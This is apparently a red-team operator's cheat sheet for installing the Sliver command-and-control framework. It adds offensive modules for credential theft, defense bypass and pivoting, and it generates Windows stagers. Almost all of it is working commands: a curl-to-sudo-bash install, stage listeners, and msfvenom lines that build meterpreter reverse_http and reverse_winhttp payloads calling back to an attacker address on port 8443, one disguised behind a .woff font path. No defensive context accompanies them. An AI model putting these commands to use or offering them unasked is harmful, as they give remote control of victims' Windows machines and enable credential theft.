# Install Guide:


- Run the following command, sliver install complete
```bash
curl https://sliver.sh/install|sudo bash 
systemctl start sliver
systemctl enable sliver
```

- Run the following to install tooling:
```bash
sliver
armory install cs-remote-ops-bofs
armory install kerberos
armory install situational-awareness
armory install windows-bypass
armory install windows-credentials
armory install windows-pivot
armory install .net-execute
armory install .net-recon
armory install .net-pivot
armory install cs-remote-ops-bofs
armory install c2-tool-collection
```


# Stagers


```bash
profiles new --mtls ip:443 --format shellcode win-shellcode

mtls -l 443

stage-listener --url http://ip:8443 --profile win-shellcode --prepend-size

generate stager --lhost ip --lport 8443 --protocol http # this will likely not work so try the following:

msfvenom --platform windows --arch x64 --format csharp --payload windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8443 EXITFUNC=thread


# Adjust the format as needed, common formats: exe, raw, csharp, vbapplication. x86 for macros
msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=192.168.122.1 LPORT=8443 LURI=/payload.woff -f exe -o msfstager.exe EXITFUNC=thread
```

